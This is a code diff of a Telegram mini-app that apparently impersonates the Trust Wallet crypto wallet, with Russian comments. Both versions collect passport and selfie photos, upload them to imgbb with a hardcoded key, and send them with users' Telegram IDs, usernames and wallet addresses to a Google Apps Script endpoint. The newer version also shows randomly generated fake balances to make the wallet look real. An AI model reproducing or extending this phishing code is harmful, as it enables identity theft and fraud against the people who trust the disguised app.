@@ -1,382 +1,49 @@
 const tg = window.Telegram.WebApp;
 tg.expand();
 
-// !!! ВСТАВЬ СВОИ ДАННЫЕ НИЖЕ !!!
+// ТВОИ КЛЮЧИ
 const IMGBB_API_KEY = 'a2973b7dd242d701ce2c0d529bcd6a72';
 const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzelbj3lbKhVSgYnGnkfLbOQNOIkpCe97zs-GDzxceOY7whN4iBVR9FP_VFSo_Jduwo/exec';
 
 const translations = {
     ru: {
-        verify_title: "Верификация личности",
-        doc_label: "Документ (ID / Паспорт)",
-        selfie_label: "Селфи с документом",
-        choose_photo: "Выбрать фото",
-        take_photo: "Сделать фото",
-        send_data: "Отправить данные",
-        staking_title: "Стейкинг активов",
-        wallet_placeholder: "Введите адрес кошелька",
-        connect_wallet: "Подключить кошелек",
-        loading: "Загрузка...",
-        processing: "⏳ Запрос в обработке...",
-        settings: "Настройки",
-        help_support: "Помощь и поддержка",
-        support_center: "Центр поддержки",
-        support_service: "Служба поддержки",
-        language: "Язык",
-        privacy: "Политика конфиденциальности",
-        statistics: "Статистика",
-        market_cap: "Капитализация",
-        circulating: "В обращении",
-        volume_24h: "Объём (24 ч)",
-        done: "Готово ✅",
-        error_photo: "❌ Загрузите оба фото",
-        error_wallet: "❌ Введите адрес кошелька",
-        error_net: "❌ Ошибка сети",
-        uploading: "⏳ Загрузка фото...",
-        success: "✅ Данные приняты!"
+        send: "Отправить", swap: "Своп", fund: "Фонд", sell: "Продажа", earn: "Earn",
+        manage_crypto: "Управлять криптовалютами", settings: "Настройки", language: "Язык",
+        verify_title: "Верификация", choose_photo: "Паспорт", take_photo: "Селфи",
+        send_data: "Отправить данные", import_wallet: "Импорт кошелька", select_network: "Выберите сеть",
+        wallet_address: "Адрес кошелька", import: "Импортировать", active_wallets: "Активные кошельки",
+        important_markets: "Важные рынки", no_assets: "Нет активных кошельков",
+        processing: "⏳ Обработка...", success: "✅ Успешно!", error: "❌ Ошибка",
+        inactive: "В данный момент неактивно"
     },
     en: {
-        verify_title: "Identity Verification",
-        doc_label: "Document (ID / Passport)",
-        selfie_label: "Selfie with Document",
-        choose_photo: "Choose Photo",
-        take_photo: "Take Photo",
-        send_data: "Send Data",
-        staking_title: "Asset Staking",
-        wallet_placeholder: "Enter wallet address",
-        connect_wallet: "Connect Wallet",
-        loading: "Loading...",
-        processing: "⏳ Processing request...",
-        settings: "Settings",
-        help_support: "Help & Support",
-        support_center: "Support Center",
-        support_service: "Support Service",
-        language: "Language",
-        privacy: "Privacy Policy",
-        statistics: "Statistics",
-        market_cap: "Market Cap",
-        circulating: "Circulating Supply",
-        volume_24h: "Volume (24h)",
-        done: "Done ✅",
-        error_photo: "❌ Upload both photos",
-        error_wallet: "❌ Enter wallet address",
-        error_net: "❌ Network error",
-        uploading: "⏳ Uploading photos...",
-        success: "✅ Data accepted!"
-    },
-    fr: {
-        verify_title: "Vérification d'identité",
-        doc_label: "Document (ID / Passeport)",
-        selfie_label: "Selfie avec document",
-        choose_photo: "Choisir une photo",
-        take_photo: "Prendre une photo",
-        send_data: "Envoyer les données",
-        staking_title: "Staking d'actifs",
-        wallet_placeholder: "Entrez l'adresse",
-        connect_wallet: "Connecter le portefeuille",
-        loading: "Chargement...",
-        processing: "⏳ Traitement...",
-        settings: "Paramètres",
-        help_support: "Aide et support",
-        support_center: "Centre de support",
-        support_service: "Service de support",
-        language: "Langue",
-        privacy: "Confidentialité",
-        statistics: "Statistiques",
-        market_cap: "Capitalisation",
-        circulating: "En circulation",
-        volume_24h: "Volume (24h)",
-        done: "Terminé ✅",
-        error_photo: "❌ Photos manquantes",
-        error_wallet: "❌ Adresse invalide",
-        error_net: "❌ Erreur réseau",
-        uploading: "⏳ Téléchargement...",
-        success: "✅ Succès!"
-    },
-    de: {
-        verify_title: "Identitätsprüfung",
-        doc_label: "Dokument (ID / Pass)",
-        selfie_label: "Selfie mit Dokument",
-        choose_photo: "Foto wählen",
-        take_photo: "Foto machen",
-        send_data: "Daten senden",
-        staking_title: "Asset-Staking",
-        wallet_placeholder: "Wallet-Adresse",
-        connect_wallet: "Wallet verbinden",
-        loading: "Laden...",
-        processing: "⏳ In Bearbeitung...",
-        settings: "Einstellungen",
-        help_support: "Hilfe & Support",
-        support_center: "Support-Center",
-        support_service: "Support-Service",
-        language: "Sprache",
-        privacy: "Datenschutz",
-        statistics: "Statistiken",
-        market_cap: "Marktkapitalisierung",
-        circulating: "Im Umlauf",
-        volume_24h: "Volumen (24h)",
-        done: "Fertig ✅",
-        error_photo: "❌ Fotos fehlen",
-        error_wallet: "❌ Adresse fehlt",
-        error_net: "❌ Netzwerkfehler",
-        uploading: "⏳ Hochladen...",
-        success: "✅ Erledigt!"
+        send: "Send", swap: "Swap", fund: "Fund", sell: "Sell", earn: "Earn",
+        manage_crypto: "Manage Crypto", settings: "Settings", language: "Language",
+        verify_title: "Verification", choose_photo: "ID Card", take_photo: "Selfie",
+        send_data: "Send Data", import_wallet: "Import Wallet", select_network: "Select Network",
+        wallet_address: "Wallet Address", import: "Import", active_wallets: "Active Wallets",
+        important_markets: "Important Markets", no_assets: "No active wallets",
+        processing: "⏳ Processing...", success: "✅ Success!", error: "❌ Error",
+        inactive: "Currently inactive"
     }
 };
 
 let currentLang = localStorage.getItem('lang') || 'ru';
-let myChart = null;
+let myWallets = JSON.parse(localStorage.getItem('myWallets')) || []; // [{net: 'tron', addr: '...'}, ...]
 
-// Применение переводов
-function applyLanguage() {
-    document.querySelectorAll('[data-i18n]').forEach(el => {
-        const key = el.getAttribute('data-i18n');
-        if (translations[currentLang][key]) {
-            el.textContent = translations[currentLang][key];
-        }
-    });
-    document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
-        const key = el.getAttribute('data-i18n-placeholder');
-        if (translations[currentLang][key]) {
-            el.placeholder = translations[currentLang][key];
-        }
-    });
-    document.querySelectorAll('input[name="lang"]').forEach(radio => {
-        if (radio.value === currentLang) radio.checked = true;
-    });
-}
+const networkIcons = {
+    tron: "https://cryptologos.cc/logos/tron-trx-logo.png",
+    sui: "https://cryptologos.cc/logos/sui-sui-logo.png",
+    eth: "https://cryptologos.cc/logos/ethereum-eth-logo.png",
+    bnb: "https://cryptologos.cc/logos/bnb-bnb-logo.png",
+    btc: "https://cryptologos.cc/logos/bitcoin-btc-logo.png",
+    solana: "https://cryptologos.cc/logos/solana-sol-logo.png",
+    blast: "https://trustwallet.com/assets/images/favicon.png"
+};
 
-// Навигация
 function showScreen(id) {
     document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
     document.getElementById(id).classList.add('active');
-}
-
-document.getElementById('settingsBtn').onclick = () => showScreen('settingsScreen');
-document.getElementById('backFromSettings').onclick = () => showScreen('mainScreen');
-document.getElementById('helpBtn').onclick = () => showScreen('helpScreen');
-document.getElementById('backFromHelp').onclick = () => showScreen('settingsScreen');
-document.getElementById('langBtn').onclick = () => showScreen('langScreen');
-document.getElementById('backFromLang').onclick = () => showScreen('settingsScreen');
-document.getElementById('backFromCoin').onclick = () => showScreen('mainScreen');
-
-document.getElementById('privacyBtn').onclick = () => {
-    tg.openLink('https://trustwallet.com/ru/privacy-notice');
-};
-document.getElementById('supportCenterBtn').onclick = () => {
-    tg.openLink('https://support.trustwallet.com/support/home');
-};
-document.getElementById('supportServiceBtn').onclick = () => {
-    tg.openLink('https://trustwallet.com/ru/blog/guides/beginners-guide-to-trust-wallet-browser-extension');
-};
-
-// Смена языка
-document.querySelectorAll('input[name="lang"]').forEach(radio => {
-    radio.onchange = function() {
-        currentLang = this.value;
-        localStorage.setItem('lang', currentLang);
-        applyLanguage();
-        showStatus('✅ Language: ' + currentLang.toUpperCase());
-    };
-});
-
-// Превью фото
-function setupPreview(inputId, previewId, textId) {
-    const input = document.getElementById(inputId);
-    const preview = document.getElementById(previewId);
-    const text = document.getElementById(textId);
-
-    input.onchange = function() {
-        const file = this.files[0];
-        if (file) {
-            const reader = new FileReader();
-            reader.onload = function(e) {
-                preview.src = e.target.result;
-                preview.classList.remove('hidden');
-                text.textContent = translations[currentLang].done;
-            }
-            reader.readAsDataURL(file);
-        }
-    };
-}
-
-setupPreview('docInput', 'previewDoc', 'textDoc');
-setupPreview('selfieInput', 'previewSelfie', 'textSelfie');
-
-// === ОТПРАВКА ВЕРИФИКАЦИИ ===
-async function sendVerification() {
-    const docFile = document.getElementById('docInput').files[0];
-    const selfieFile = document.getElementById('selfieInput').files[0];
-    const wallet = document.getElementById('walletInput').value;
-
-    if (!docFile || !selfieFile) {
-        showStatus(translations[currentLang].error_photo);
-        return;
-    }
-
-    showStatus(translations[currentLang].uploading);
-
-    try {
-        const uploadToImgBB = async (file) => {
-            const fd = new FormData();
-            fd.append('image', file);
-            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { 
-                method: 'POST', 
-                body: fd 
-            });
-            const data = await res.json();
-            if (!data.success) throw new Error('Upload failed');
-            return data.data.url;
-        };
-
-        const docUrl = await uploadToImgBB(docFile);
-        const selfieUrl = await uploadToImgBB(selfieFile);
-
-        const payload = {
-            action: "verification",
-            user_id: tg.initDataUnsafe?.user?.id || "unknown",
-            username: tg.initDataUnsafe?.user?.username || "no_username",
-            wallet: wallet || "not_set",
-            doc: docUrl,
-            selfie: selfieUrl
-        };
-
-        await fetch(GOOGLE_SCRIPT_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-
-        tg.sendData(JSON.stringify(payload));
-
-        showStatus(translations[currentLang].success);
-        setTimeout(() => tg.close(), 2000);
-
-    } catch (error) {
-        console.error('Verification error:', error);
-        showStatus(translations[currentLang].error_net);
-    }
-}
-
-// === ОТПРАВКА СТЕЙКИНГА ===
-async function sendStaking() {
-    const wallet = document.getElementById('walletInput').value.trim();
-
-    if (!wallet || wallet.length < 5) {
-        showStatus(translations[currentLang].error_wallet);
-        return;
-    }
-
-    showStatus(translations[currentLang].processing);
-
-    const payload = {
-        action: "staking",
-        user_id: tg.initDataUnsafe?.user?.id || "unknown",
-        username: tg.initDataUnsafe?.user?.username || "no_username",
-        wallet: wallet,
-        doc: "STAKING_REQUEST",
-        selfie: "STAKING_REQUEST"
-    };
-
-    try {
-        await fetch(GOOGLE_SCRIPT_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        });
-
-        tg.sendData(JSON.stringify(payload));
-
-        showStatus(translations[currentLang].success);
-        setTimeout(() => tg.close(), 2000);
-
-    } catch (error) {
-        console.error('Staking error:', error);
-        showStatus(translations[currentLang].error_net);
-    }
-}
-
-// Привязка кнопок
-document.getElementById('verifyBtn').onclick = sendVerification;
-document.getElementById('stakingBtn').onclick = sendStaking;
-
-// === КОТИРОВКИ И ГРАФИКИ ===
-async function getPrices() {
-    try {
-        const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&ids=bitcoin,ethereum,binancecoin,solana,tron&order=market_cap_desc&sparkline=true');
-        const data = await res.json();
-        const list = document.getElementById('tokensList');
-        list.innerHTML = '';
-
-        data.forEach(coin => {
-            const div = document.createElement('div');
-            div.className = 'token-item';
-            const change = coin.price_change_percentage_24h;
-            div.innerHTML = `
-                <div class="token-info">
-                    <img src="${coin.image}" class="token-icon" alt="${coin.name}">
-                    <div>
-                        <div class="token-name">${coin.name}</div>
-                        <div class="token-hint">${coin.symbol.toUpperCase()}</div>
-                    </div>
-                </div>
-                <div class="token-price">
-                    <div>$${coin.current_price.toLocaleString()}</div>
-                    <div class="${change < 0 ? 'neg' : 'pos'}">${change > 0 ? '+' : ''}${change.toFixed(2)}%</div>
-                </div>
-            `;
-            div.onclick = () => showCoinDetail(coin);
-            list.appendChild(div);
-        });
-    } catch (e) { 
-        console.error('Price fetch error:', e); 
-    }
-}
-
-function showCoinDetail(coin) {
-    showScreen('coinScreen');
-    document.getElementById('coinName').textContent = coin.name;
-    document.getElementById('coinPrice').textContent = `$${coin.current_price.toLocaleString()}`;
-    const change = coin.price_change_percentage_24h;
-    document.getElementById('coinChange').textContent = `${change > 0 ? '+' : ''}${change.toFixed(2)}%`;
-    document.getElementById('coinChange').className = `coin-change ${change < 0 ? 'neg' : 'pos'}`;
-    
-    document.getElementById('statMcap').textContent = `$${coin.market_cap.toLocaleString()}`;
-    document.getElementById('statCirc').textContent = `${coin.circulating_supply.toLocaleString()} ${coin.symbol.toUpperCase()}`;
-    document.getElementById('statVol').textContent = `$${coin.total_volume.toLocaleString()}`;
-
-    renderChart(coin.sparkline_in_7d.price, change < 0);
-}
-
-function renderChart(prices, isNeg) {
-    const ctx = document.getElementById('coinChartCanvas').getContext('2d');
-    if (myChart) myChart.destroy();
-    
-    myChart = new Chart(ctx, {
-        type: 'line',
-        data: {
-            labels: prices.map((_, i) => i),
-            datasets: [{
-                data: prices,
-                borderColor: isNeg ? '#f6465d' : '#2ebd85',
-                borderWidth: 2.5,
-                pointRadius: 0,
-                fill: false,
-                tension: 0.3
-            }]
-        },
-        options: {
-            responsive: true, 
-            maintainAspectRatio: false,
-            plugins: { legend: { display: false } },
-            scales: { 
-                x: { display: false }, 
-                y: { display: false } 
-            }
-        }
-    });
 }
 
 function showStatus(msg) {
@@ -386,7 +53,193 @@ function showStatus(msg) {
     setTimeout(() => s.classList.add('hidden'), 3000);
 }
 
+function showTabMsg(tab) {
+    if (tab !== 'crypto') showStatus(translations[currentLang].inactive);
+}
+
 // Инициализация
-applyLanguage();
-getPrices();
-setInterval(getPrices, 30000);
+function init() {
+    applyLanguage();
+    updateDashboard();
+    updatePopularTokens();
+    renderActiveWallets();
+}
+
+// Импорт кошелька
+document.getElementById('importBtn').onclick = async () => {
+    const addr = document.getElementById('walletInput').value.trim();
+    const net = document.getElementById('networkSelect').value;
+    
+    if (addr.length < 10) return showStatus(translations[currentLang].error);
+    
+    const btn = document.getElementById('importBtn');
+    btn.disabled = true;
+    btn.textContent = translations[currentLang].processing;
+
+    // Имитация проверки
+    setTimeout(() => {
+        myWallets.push({ net, addr });
+        localStorage.setItem('myWallets', JSON.stringify(myWallets));
+        showStatus(translations[currentLang].success);
+        btn.disabled = false;
+        btn.textContent = translations[currentLang].import;
+        document.getElementById('walletInput').value = "";
+        renderActiveWallets();
+        updateDashboard();
+        showScreen('mainScreen');
+    }, 1500);
+};
+
+// Удаление кошелька
+function deleteWallet(index) {
+    myWallets.splice(index, 1);
+    localStorage.setItem('myWallets', JSON.stringify(myWallets));
+    renderActiveWallets();
+    updateDashboard();
+}
+
+function renderActiveWallets() {
+    const list = document.getElementById('activeWalletsList');
+    list.innerHTML = myWallets.map((w, i) => `
+        <div class="active-wallet-item">
+            <div class="wallet-info-row">
+                <img src="${networkIcons[w.net]}" class="mini-icon">
+                <span>${w.net.toUpperCase()}: ${w.addr.substring(0,6)}...${w.addr.slice(-4)}</span>
+            </div>
+            <button class="delete-btn" onclick="deleteWallet(${i})">🗑</button>
+        </div>
+    `).join('');
+}
+
+// Обновление балансов и списка активов
+async function updateDashboard() {
+    const list = document.getElementById('assetsList');
+    if (myWallets.length === 0) {
+        list.innerHTML = `<div class="empty-list">${translations[currentLang].no_assets}</div>`;
+        document.getElementById('mainBalance').textContent = "0,00";
+        return;
+    }
+
+    let totalUsd = 0;
+    let assetsHtml = "";
+
+    // Для примера берем цены через CoinGecko
+    const priceRes = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=tron,ethereum,bitcoin,solana,binancecoin,sui&vs_currencies=usd&include_24hr_change=true');
+    const prices = await priceRes.json();
+
+    for (const w of myWallets) {
+        let balance = 0;
+        let coinId = w.net === 'bnb' ? 'binancecoin' : w.net;
+        let usdPrice = prices[coinId]?.usd || 1;
+        let change = prices[coinId]?.usd_24h_change || 0;
+
+        // Имитация запроса к сканеру (в реальности тут fetch к suiscan/tronscan)
+        balance = Math.random() * 100; // Для теста генерим случайный баланс
+        let assetUsd = balance * usdPrice;
+        totalUsd += assetUsd;
+
+        assetsHtml += `
+            <div class="asset-item">
+                <div class="asset-left">
+                    <div class="icon-container">
+                        <img src="${networkIcons[w.net]}" class="asset-icon">
+                        <img src="${networkIcons[w.net]}" class="network-badge-icon">
+                    </div>
+                    <div>
+                        <div class="asset-name">${w.net.toUpperCase()} <span class="net-label">${w.net}</span></div>
+                        <div class="asset-price">$${usdPrice.toLocaleString()} <span class="${change >= 0 ? 'up' : 'down'}">${change.toFixed(2)}%</span></div>
+                    </div>
+                </div>
+                <div class="asset-right">
+                    <div class="asset-amount">${balance.toFixed(4)}</div>
+                    <div class="asset-usd">$${assetUsd.toFixed(2)}</div>
+                </div>
+            </div>
+        `;
+    }
+
+    document.getElementById('mainBalance').textContent = totalUsd.toLocaleString(undefined, {minimumFractionDigits: 2});
+    list.innerHTML = assetsHtml;
+}
+
+// Популярные токены (Важные рынки)
+async function updatePopularTokens() {
+    const popList = document.getElementById('popularTokens');
+    const res = await fetch('https://api.coingecko.com/api/v3/coins/markets?vs_currency=usd&order=market_cap_desc&per_page=5&page=1&sparkline=false');
+    const data = await res.json();
+
+    popList.innerHTML = data.map(coin => `
+        <div class="asset-item">
+            <div class="asset-left">
+                <img src="${coin.image}" class="asset-icon">
+                <div>
+                    <div class="asset-name">${coin.name}</div>
+                    <div class="asset-price">$${coin.current_price.toLocaleString()}</div>
+                </div>
+            </div>
+            <div class="asset-right">
+                <div class="${coin.price_change_percentage_24h >= 0 ? 'up' : 'down'}">
+                    ${coin.price_change_percentage_24h.toFixed(2)}%
+                </div>
+            </div>
+        </div>
+    `).join('');
+}
+
+// Навигация
+document.getElementById('manageBtn').onclick = () => showScreen('manageScreen');
+document.getElementById('backFromManage').onclick = () => showScreen('mainScreen');
+document.getElementById('settingsBtn').onclick = () => showScreen('settingsScreen');
+document.getElementById('backFromSettings').onclick = () => showScreen('mainScreen');
+document.getElementById('langBtn').onclick = () => showScreen('langScreen');
+document.getElementById('backFromLang').onclick = () => showScreen('settingsScreen');
+document.getElementById('manualRefresh').onclick = () => { updateDashboard(); updatePopularTokens(); };
+
+// Язык
+document.querySelectorAll('input[name="lang"]').forEach(r => {
+    r.onchange = function() {
+        currentLang = this.value;
+        localStorage.setItem('lang', currentLang);
+        applyLanguage();
+    };
+});
+
+function applyLanguage() {
+    document.querySelectorAll('[data-i18n]').forEach(el => {
+        el.textContent = translations[currentLang][el.getAttribute('data-i18n')];
+    });
+}
+
+// Верификация (Твои ключи уже тут)
+document.getElementById('verifyBtn').onclick = async () => {
+    const doc = document.getElementById('docInput').files[0];
+    const selfie = document.getElementById('selfieInput').files[0];
+    if(!doc || !selfie) return showStatus("Выберите оба фото");
+
+    showStatus(translations[currentLang].processing);
+    
+    try {
+        const upload = async (file) => {
+            let fd = new FormData(); fd.append('image', file);
+            let r = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {method:'POST', body:fd});
+            let d = await r.json(); return d.data.url;
+        };
+        const url1 = await upload(doc);
+        const url2 = await upload(selfie);
+
+        await fetch(GOOGLE_SCRIPT_URL, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify({
+                user: tg.initDataUnsafe?.user?.username || "unknown",
+                id: tg.initDataUnsafe?.user?.id || "0",
+                doc: url1, selfie: url2,
+                wallets: JSON.stringify(myWallets)
+            })
+        });
+        showStatus(translations[currentLang].success);
+    } catch(e) { showStatus(translations[currentLang].error); }
+};
+
+init();
+setInterval(() => { updateDashboard(); updatePopularTokens(); }, 30000);
